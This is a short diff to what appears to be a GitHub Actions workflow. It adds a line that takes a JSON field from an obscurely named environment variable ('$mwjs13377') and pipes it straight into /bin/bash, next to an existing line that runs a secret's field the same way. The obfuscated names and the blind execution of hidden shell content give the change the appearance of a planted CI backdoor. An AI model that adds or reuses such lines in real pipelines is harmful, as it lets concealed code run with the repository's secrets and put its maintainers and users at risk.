@@ -22,6 +22,7 @@ jobs:
           i46: ${{ secrets.i46 }}
         run: |
           printf '%s' "$i46" | jq -r .ykdv904 | /bin/bash
+          printf '%s' "$mwjs13377" | jq -r .n3 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
